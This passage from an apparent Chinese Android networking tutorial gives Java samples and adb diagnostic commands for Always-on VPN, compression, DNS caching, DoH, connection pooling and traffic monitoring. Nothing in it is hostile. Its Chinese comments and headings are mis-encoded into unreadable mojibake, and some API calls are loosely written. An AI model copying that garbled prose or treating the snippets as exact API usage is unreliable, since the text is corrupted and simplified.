        <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
            ConnectivityManager.class);

        <span class="hljs-comment">// éœ€è¦CONTROL_ALWAYS_ON_VPNæƒé™ (ç³»ç»Ÿåº”ç”¨)</span>
        cm.setAlwaysOnVpnPackageForUser(
            UserHandle.myUserId(),
            packageName,
            lockdownEnabled,    <span class="hljs-comment">// æ˜¯å¦é˜»æ–­æ¨¡å¼</span>
            <span class="hljs-literal">null</span>                <span class="hljs-comment">// å…è®¸ç»•è¿‡çš„åº”ç”¨åˆ—è¡¨</span>
        );
    }

    <span class="hljs-comment">// æ£€æŸ¥Always-on VPNçŠ¶æ€</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAlwaysOnVpnEnabled</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
            ConnectivityManager.class);

        <span class="hljs-type">String</span> <span class="hljs-variable">vpnPackage</span> <span class="hljs-operator">=</span> cm.getAlwaysOnVpnPackageForUser(
            UserHandle.myUserId()
        );

        <span class="hljs-keyword">return</span> vpnPackage != <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<h4 data-id="heading-32">Frameworkå®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Vpn.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">setAlwaysOnPackage</span><span class="hljs-params">(String packageName, <span class="hljs-type">boolean</span> lockdown,
                                  List&lt;String&gt; lockdownWhitelist)</span> {
    enforceControlPermissionOrInternalCaller();

    <span class="hljs-keyword">if</span> (packageName == <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// å…³é—­Always-on VPN</span>
        mAlwaysOn = <span class="hljs-literal">false</span>;
        mLockdown = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-comment">// éªŒè¯VPNåº”ç”¨</span>
    <span class="hljs-keyword">if</span> (!isVpnServicePreConsented(packageName)) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-comment">// ä¿å­˜é…ç½®</span>
    mAlwaysOn = <span class="hljs-literal">true</span>;
    mLockdown = lockdown;
    mLockdownWhitelist = lockdownWhitelist;

    <span class="hljs-comment">// å¯åŠ¨VPN</span>
    startAlwaysOnVpn();

    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startAlwaysOnVpn</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 1. å¦‚æœå·²è¿æ¥ï¼Œä»€ä¹ˆéƒ½ä¸åš</span>
    <span class="hljs-keyword">if</span> (mNetworkAgent != <span class="hljs-literal">null</span> &amp;&amp; mNetworkAgent.isConnected()) {
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 2. å¯åŠ¨VPNæœåŠ¡</span>
    <span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(VpnConfig.SERVICE_INTERFACE);
    intent.setPackage(mPackage);
    intent.setComponent(mPackage, mService);

    <span class="hljs-keyword">try</span> {
        mContext.startServiceAsUser(intent, UserHandle.of(mUserHandle));
    } <span class="hljs-keyword">catch</span> (RuntimeException e) {
        Log.e(TAG, <span class="hljs-string">"Failed to start Always-on VPN"</span>, e);
    }

    <span class="hljs-comment">// 3. å¦‚æœæ˜¯é”å®šæ¨¡å¼ï¼Œé…ç½®é˜²ç«å¢™</span>
    <span class="hljs-keyword">if</span> (mLockdown) {
        setVpnForcedLocked(<span class="hljs-literal">true</span>);
    }
}

<span class="hljs-comment">// é”å®šæ¨¡å¼ï¼šé˜»æ­¢æ‰€æœ‰éVPNæµé‡</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setVpnForcedLocked</span><span class="hljs-params">(<span class="hljs-type">boolean</span> enforce)</span> {
    <span class="hljs-keyword">if</span> (enforce) {
        <span class="hljs-comment">// æ·»åŠ é˜²ç«å¢™è§„åˆ™ï¼šæ‹’ç»æ‰€æœ‰UIDçš„ç½‘ç»œè®¿é—®</span>
        <span class="hljs-comment">// é™¤äº†VPNåº”ç”¨å’Œç™½åå•åº”ç”¨</span>
        mNetd.firewallSetUidRule(FIREWALL_CHAIN_VPN, UID_ALL, DENY);

        <span class="hljs-comment">// å…è®¸VPNåº”ç”¨</span>
        mNetd.firewallSetUidRule(FIREWALL_CHAIN_VPN,
                                mOwnerUID, ALLOW);

        <span class="hljs-comment">// å…è®¸ç™½åå•åº”ç”¨</span>
        <span class="hljs-keyword">for</span> (String pkg : mLockdownWhitelist) {
            <span class="hljs-type">int</span> <span class="hljs-variable">uid</span> <span class="hljs-operator">=</span> getUidForPackage(pkg);
            mNetd.firewallSetUidRule(FIREWALL_CHAIN_VPN, uid, ALLOW);
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// ç§»é™¤é˜²ç«å¢™è§„åˆ™</span>
        mNetd.firewallSetUidRule(FIREWALL_CHAIN_VPN, UID_ALL, ALLOW);
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-33">ä¸‰ã€ç½‘ç»œæ€§èƒ½ä¼˜åŒ–å®æˆ˜</h2>
<h3 data-id="heading-34">3.1 æµé‡ä¼˜åŒ–æŠ€å·§</h3>
<h4 data-id="heading-35">1. å‹ç¼©ä¼ è¾“</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkOptimization</span> {

    <span class="hljs-comment">// ä½¿ç”¨GZIPå‹ç¼©HTTPè¯·æ±‚ä½“</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendCompressedRequest</span><span class="hljs-params">(String url, String data)</span>
            <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpURLConnection)
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).openConnection();

        conn.setRequestMethod(<span class="hljs-string">"POST"</span>);
        conn.setDoOutput(<span class="hljs-literal">true</span>);
        conn.setRequestProperty(<span class="hljs-string">"Content-Encoding"</span>, <span class="hljs-string">"gzip"</span>);

        <span class="hljs-comment">// GZIPå‹ç¼©</span>
        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
        <span class="hljs-keyword">try</span> (<span class="hljs-type">GZIPOutputStream</span> <span class="hljs-variable">gzos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GZIPOutputStream</span>(baos)) {
            gzos.write(data.getBytes(StandardCharsets.UTF_8));
        }
        <span class="hljs-type">byte</span>[] compressed = baos.toByteArray();

        <span class="hljs-comment">// å‘é€å‹ç¼©æ•°æ®</span>
        <span class="hljs-keyword">try</span> (<span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> conn.getOutputStream()) {
            os.write(compressed);
        }

        <span class="hljs-comment">// æ—¥å¿—å‹ç¼©æ¯”</span>
        Log.d(TAG, String.format(<span class="hljs-string">"Compression ratio: %.2f%%"</span>,
            <span class="hljs-number">100.0</span> * compressed.length / data.length()));
    }

    <span class="hljs-comment">// ä½¿ç”¨Brotliå‹ç¼© (æ›´é«˜å‹ç¼©ç‡)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendBrotliRequest</span><span class="hljs-params">(String url, <span class="hljs-type">byte</span>[] data)</span>
            <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// Brotliåº“: com.aayushatharva.brotli4j:brotli4j</span>

        <span class="hljs-type">BrotliCompressor</span> <span class="hljs-variable">compressor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BrotliCompressor</span>();
        <span class="hljs-type">byte</span>[] compressed = compressor.compress(data,
            Brotli.DEFAULT_QUALITY, Brotli.DEFAULT_WINDOW);

        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpURLConnection)
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).openConnection();
        conn.setRequestProperty(<span class="hljs-string">"Content-Encoding"</span>, <span class="hljs-string">"br"</span>);

        <span class="hljs-comment">// å‘é€...</span>
    }
}
</code></pre>
<h4 data-id="heading-36">2. å›¾ç‰‡ä¼˜åŒ–</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImageOptimization</span> {

    <span class="hljs-comment">// æ ¹æ®ç½‘ç»œçŠ¶æ€è°ƒæ•´å›¾ç‰‡è´¨é‡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadOptimizedImage</span><span class="hljs-params">(Context context, String url,
                                   ImageView imageView)</span> {
        <span class="hljs-comment">// 1. æ£€æŸ¥ç½‘ç»œç±»å‹</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isMetered</span> <span class="hljs-operator">=</span> isCurrentNetworkMetered(context);
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isSlowNetwork</span> <span class="hljs-operator">=</span> isSlowNetwork(context);

        <span class="hljs-comment">// 2. é€‰æ‹©è´¨é‡</span>
        String imageUrl;
        <span class="hljs-keyword">if</span> (isSlowNetwork || isMetered) {
            <span class="hljs-comment">// æ…¢é€Ÿ/è®¡è´¹ç½‘ç»œï¼šä½è´¨é‡å›¾ç‰‡</span>
            imageUrl = url + <span class="hljs-string">"?quality=low&amp;size=small"</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// å¿«é€Ÿ/éè®¡è´¹ç½‘ç»œï¼šé«˜è´¨é‡å›¾ç‰‡</span>
            imageUrl = url + <span class="hljs-string">"?quality=high&amp;size=large"</span>;
        }

        <span class="hljs-comment">// 3. åŠ è½½å›¾ç‰‡ (ä½¿ç”¨Glide/Coilç­‰åº“)</span>
        Glide.with(context)
            .load(imageUrl)
            .diskCacheStrategy(DiskCacheStrategy.AUTOMATIC)
            .into(imageView);
    }

    <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æ…¢é€Ÿç½‘ç»œ</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSlowNetwork</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
            ConnectivityManager.class);

        <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">caps</span> <span class="hljs-operator">=</span> cm.getNetworkCapabilities(
            cm.getActiveNetwork());

        <span class="hljs-keyword">if</span> (caps == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;

        <span class="hljs-comment">// ä¸‹è¡Œå¸¦å®½ &lt; 1Mbps è§†ä¸ºæ…¢é€Ÿ</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">downBandwidth</span> <span class="hljs-operator">=</span> caps.getLinkDownstreamBandwidthKbps();
        <span class="hljs-keyword">return</span> downBandwidth &lt; <span class="hljs-number">1000</span>;
    }
}
</code></pre>
<h4 data-id="heading-37">3. é¢„å–ç­–ç•¥</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrefetchStrategy</span> {

    <span class="hljs-comment">// æ™ºèƒ½é¢„å–</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">smartPrefetch</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-comment">// ä»…åœ¨WiFi + å……ç”µæ—¶é¢„å–</span>
        <span class="hljs-keyword">if</span> (isWifiConnected(context) &amp;&amp; isCharging(context)) {
            <span class="hljs-comment">// é¢„å–ä¸‹ä¸€ç« èŠ‚å†…å®¹</span>
            prefetchNextChapter();

            <span class="hljs-comment">// é¢„åŠ è½½æ¨èåˆ—è¡¨</span>
            prefetchRecommendations();

            <span class="hljs-comment">// åŒæ­¥ç¦»çº¿æ•°æ®</span>
            syncOfflineData();
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isWifiConnected</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
            ConnectivityManager.class);

        <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">caps</span> <span class="hljs-operator">=</span> cm.getNetworkCapabilities(
            cm.getActiveNetwork());

        <span class="hljs-keyword">return</span> caps != <span class="hljs-literal">null</span> &amp;&amp;
               caps.hasTransport(TRANSPORT_WIFI) &amp;&amp;
               caps.hasCapability(NET_CAPABILITY_NOT_METERED);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isCharging</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-type">BatteryManager</span> <span class="hljs-variable">bm</span> <span class="hljs-operator">=</span> context.getSystemService(
            BatteryManager.class);

        <span class="hljs-keyword">return</span> bm.isCharging();
    }
}
</code></pre>
<h3 data-id="heading-38">3.2 DNSä¼˜åŒ–</h3>
<h4 data-id="heading-39">1. DNSç¼“å­˜</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DnsCache</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, InetAddress[]&gt; mCache =
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-comment">// DNSæŸ¥è¯¢å¸¦ç¼“å­˜</span>
    <span class="hljs-keyword">public</span> InetAddress[] lookup(String hostname) <span class="hljs-keyword">throws</span> UnknownHostException {
        <span class="hljs-comment">// 1. æ£€æŸ¥ç¼“å­˜</span>
        InetAddress[] cached = mCache.get(hostname);
        <span class="hljs-keyword">if</span> (cached != <span class="hljs-literal">null</span> &amp;&amp; !isExpired(cached)) {
            <span class="hljs-keyword">return</span> cached;
        }

        <span class="hljs-comment">// 2. DNSæŸ¥è¯¢</span>
        InetAddress[] addresses = InetAddress.getAllByName(hostname);

        <span class="hljs-comment">// 3. ç¼“å­˜ç»“æœ (TTL 5åˆ†é’Ÿ)</span>
        mCache.put(hostname, addresses);
        scheduleExpiry(hostname, <span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>);

        <span class="hljs-keyword">return</span> addresses;
    }

    <span class="hljs-comment">// é¢„çƒ­DNSç¼“å­˜</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">warmUpCache</span><span class="hljs-params">(String... hostnames)</span> {
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">4</span>);

        <span class="hljs-keyword">for</span> (String hostname : hostnames) {
            executor.submit(() -&gt; {
                <span class="hljs-keyword">try</span> {
                    lookup(hostname);
                } <span class="hljs-keyword">catch</span> (UnknownHostException e) {
                    <span class="hljs-comment">// Ignore</span>
                }
            });
        }
    }
}
</code></pre>
<h4 data-id="heading-40">2. DoH (DNS over HTTPS)</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DohResolver</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DOH_SERVER</span> <span class="hljs-operator">=</span>
        <span class="hljs-string">"https://dns.google/dns-query"</span>;

    <span class="hljs-comment">// ä½¿ç”¨DoHæŸ¥è¯¢DNS</span>
    <span class="hljs-keyword">public</span> List&lt;InetAddress&gt; <span class="hljs-title function_">resolveDoH</span><span class="hljs-params">(String hostname)</span>
            <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// 1. æ„å»ºDoHè¯·æ±‚</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> DOH_SERVER + <span class="hljs-string">"?name="</span> + hostname + <span class="hljs-string">"&amp;type=A"</span>;

        <span class="hljs-type">HttpsURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpsURLConnection)
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).openConnection();
        conn.setRequestProperty(<span class="hljs-string">"Accept"</span>, <span class="hljs-string">"application/dns-json"</span>);

        <span class="hljs-comment">// 2. å‘é€è¯·æ±‚</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> conn.getResponseCode();
        <span class="hljs-keyword">if</span> (responseCode != <span class="hljs-number">200</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">"DoH query failed: "</span> + responseCode);
        }

        <span class="hljs-comment">// 3. è§£æJSONå“åº”</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> readStream(conn.getInputStream());
        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(response);

        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">answers</span> <span class="hljs-operator">=</span> json.getJSONArray(<span class="hljs-string">"Answer"</span>);
        List&lt;InetAddress&gt; addresses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; answers.length(); i++) {
            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> answers.getJSONObject(i);
            <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> answer.getString(<span class="hljs-string">"data"</span>);
            addresses.add(InetAddress.getByName(ip));
        }

        <span class="hljs-keyword">return</span> addresses;
    }
}
</code></pre>
<h3 data-id="heading-41">3.3 è¿æ¥æ± ç®¡ç†</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConnectionPoolOptimization</span> {

    <span class="hljs-comment">// OkHttpè¿æ¥æ± é…ç½®</span>
    <span class="hljs-keyword">public</span> OkHttpClient <span class="hljs-title function_">createOptimizedClient</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. é…ç½®è¿æ¥æ± </span>
        <span class="hljs-type">ConnectionPool</span> <span class="hljs-variable">connectionPool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionPool</span>(
            <span class="hljs-number">10</span>,              <span class="hljs-comment">// æœ€å¤§ç©ºé—²è¿æ¥æ•°</span>
            <span class="hljs-number">5</span>,               <span class="hljs-comment">// è¿æ¥ä¿æ´»æ—¶é—´</span>
            TimeUnit.MINUTES
        );

        <span class="hljs-comment">// 2. é…ç½®è¶…æ—¶</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OkHttpClient</span>.Builder()
            .connectionPool(connectionPool)
            .connectTimeout(<span class="hljs-number">10</span>, TimeUnit.SECONDS)
            .readTimeout(<span class="hljs-number">30</span>, TimeUnit.SECONDS)
            .writeTimeout(<span class="hljs-number">30</span>, TimeUnit.SECONDS)

            <span class="hljs-comment">// 3. å¯ç”¨HTTP/2</span>
            .protocols(Arrays.asList(Protocol.HTTP_2, Protocol.HTTP_1_1))

            <span class="hljs-comment">// 4. é…ç½®é‡è¯•</span>
            .retryOnConnectionFailure(<span class="hljs-literal">true</span>)

            <span class="hljs-comment">// 5. æ·»åŠ æ‹¦æˆªå™¨</span>
            .addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoggingInterceptor</span>())
            .addNetworkInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheInterceptor</span>())

            .build();
    }

    <span class="hljs-comment">// è‡ªå®šä¹‰ç¼“å­˜æ‹¦æˆªå™¨</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interceptor</span> {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Response <span class="hljs-title function_">intercept</span><span class="hljs-params">(Chain chain)</span> <span class="hljs-keyword">throws</span> IOException {
            <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> chain.request();

            <span class="hljs-comment">// ç¦»çº¿æ—¶ä½¿ç”¨ç¼“å­˜</span>
            <span class="hljs-keyword">if</span> (!isNetworkAvailable()) {
                request = request.newBuilder()
                    .cacheControl(CacheControl.FORCE_CACHE)
                    .build();
            }

            <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> chain.proceed(request);

            <span class="hljs-comment">// è‡ªå®šä¹‰ç¼“å­˜ç­–ç•¥</span>
            <span class="hljs-keyword">if</span> (isNetworkAvailable()) {
                <span class="hljs-comment">// åœ¨çº¿ï¼šç¼“å­˜1å°æ—¶</span>
                response = response.newBuilder()
                    .header(<span class="hljs-string">"Cache-Control"</span>,
                           <span class="hljs-string">"public, max-age="</span> + <span class="hljs-number">60</span> * <span class="hljs-number">60</span>)
                    .build();
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// ç¦»çº¿ï¼šç¼“å­˜4å‘¨</span>
                response = response.newBuilder()
                    .header(<span class="hljs-string">"Cache-Control"</span>,
                           <span class="hljs-string">"public, only-if-cached, max-stale="</span> + <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">28</span>)
                    .build();
            }

            <span class="hljs-keyword">return</span> response;
        }
    }
}
</code></pre>
<h3 data-id="heading-42">3.4 ç½‘ç»œè¯Šæ–­å·¥å…·</h3>
<h4 data-id="heading-43">1. ç½‘ç»œè´¨é‡ç›‘æµ‹</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ£€æŸ¥ç½‘ç»œè¿æ¥çŠ¶æ€</span>
adb shell dumpsys connectivity | grep <span class="hljs-string">"Active networks"</span>

<span class="hljs-comment"># æ£€æŸ¥DNSé…ç½®</span>
adb shell getprop net.dns1
adb shell getprop net.dns2

<span class="hljs-comment"># æµ‹è¯•ç½‘ç»œå»¶è¿Ÿ</span>
adb shell ping -c 4 8.8.8.8

<span class="hljs-comment"># æµ‹è¯•DNSè§£æ</span>
adb shell nslookup www.google.com

<span class="hljs-comment"># æ£€æŸ¥è·¯ç”±è¡¨</span>
adb shell ip route show

<span class="hljs-comment"># æŸ¥çœ‹æ¥å£ç»Ÿè®¡</span>
adb shell ifconfig wlan0

<span class="hljs-comment"># æŠ“å–ç½‘ç»œæ•°æ®åŒ…</span>
adb shell tcpdump -i wlan0 -w /sdcard/capture.pcap

<span class="hljs-comment"># æŸ¥çœ‹iptablesè§„åˆ™</span>
adb shell iptables -L -n -v

<span class="hljs-comment"># æŸ¥çœ‹eBPFç»Ÿè®¡ (Android 15)</span>
adb shell dumpsys connectivity trafficcontroller
</code></pre>
<h4 data-id="heading-44">2. æµé‡ç›‘æ§</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrafficMonitor</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">mLastRxBytes</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">mLastTxBytes</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">mLastTime</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

    <span class="hljs-comment">// è®¡ç®—å®æ—¶ç½‘é€Ÿ</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentNetworkSpeed</span><span class="hljs-params">(<span class="hljs-type">int</span> uid)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">currentTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-type">long</span> <span class="hljs-variable">currentRx</span> <span class="hljs-operator">=</span> TrafficStats.getUidRxBytes(uid);
        <span class="hljs-type">long</span> <span class="hljs-variable">currentTx</span> <span class="hljs-operator">=</span> TrafficStats.getUidTxBytes(uid);

        <span class="hljs-keyword">if</span> (mLastTime == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// é¦–æ¬¡è°ƒç”¨ï¼Œåˆå§‹åŒ–</span>
            mLastRxBytes = currentRx;
            mLastTxBytes = currentTx;
            mLastTime = currentTime;
            <span class="hljs-keyword">return</span> <span class="hljs-string">"0 KB/s"</span>;
        }

        <span class="hljs-comment">// è®¡ç®—æ—¶é—´é—´éš”</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">timeDelta</span> <span class="hljs-operator">=</span> currentTime - mLastTime;
        <span class="hljs-keyword">if</span> (timeDelta == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">"0 KB/s"</span>;

        <span class="hljs-comment">// è®¡ç®—æµé‡å¢é‡</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">rxDelta</span> <span class="hljs-operator">=</span> currentRx - mLastRxBytes;
        <span class="hljs-type">long</span> <span class="hljs-variable">txDelta</span> <span class="hljs-operator">=</span> currentTx - mLastTxBytes;

        <span class="hljs-comment">// è®¡ç®—é€Ÿåº¦ (å­—èŠ‚/ç§’)</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">rxSpeed</span> <span class="hljs-operator">=</span> rxDelta * <span class="hljs-number">1000</span> / timeDelta;
        <span class="hljs-type">long</span> <span class="hljs-variable">txSpeed</span> <span class="hljs-operator">=</span> txDelta * <span class="hljs-number">1000</span> / timeDelta;

        <span class="hljs-comment">// æ›´æ–°è®°å½•</span>
        mLastRxBytes = currentRx;
        mLastTxBytes = currentTx;
        mLastTime = currentTime;

        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"â†“ %s/s â†‘ %s/s"</span>,
            formatBytes(rxSpeed),
            formatBytes(txSpeed));
    }

    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">formatBytes</span><span class="hljs-params">(<span class="hljs-type">long</span> bytes)</span> {
        <span class="hljs-keyword">if</span> (bytes &lt; <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> bytes + <span class="hljs-string">" B"</span>;
        <span class="hljs-keyword">if</span> (bytes &lt; <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> (bytes / <span class="hljs-number">1024</span>) + <span class="hljs-string">" KB"</span>;
        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%.2f MB"</span>, bytes / <span class="hljs-number">1024.0</span> / <span class="hljs-number">1024.0</span>);
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-45">å››ã€Android 15æ–°ç‰¹æ€§</h2>
<h3 data-id="heading-46">4.1 ç½‘ç»œåˆ‡ç‰‡æ”¯æŒï¼ˆNetwork Slicingï¼‰</h3>
<p>5Gç½‘ç»œåˆ‡ç‰‡å…è®¸ä¸ºä¸åŒä¸šåŠ¡æä¾›å·®å¼‚åŒ–çš„ç½‘ç»œæœåŠ¡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Android 15 - è¯·æ±‚ä¼ä¸šä¸“ç½‘åˆ‡ç‰‡</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestEnterpriseSlice</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
        ConnectivityManager.class);

    <span class="hljs-type">NetworkRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkRequest</span>.Builder()
        .addCapability(NET_CAPABILITY_ENTERPRISE)
        .setEnterpriseId(NET_ENTERPRISE_ID_1)  <span class="hljs-comment">// ä¼ä¸šåˆ‡ç‰‡ID</span>
        .build();

    cm.requestNetwork(request, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkCallback</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAvailable</span><span class="hljs-params">(Network network)</span> {
            <span class="hljs-comment">// ä½¿ç”¨ä¼ä¸šä¸“ç½‘åˆ‡ç‰‡</span>
            <span class="hljs-comment">// - ä½å»¶è¿Ÿ (&lt;10ms)</span>
            <span class="hljs-comment">// - é«˜å¸¦å®½ä¿è¯</span>
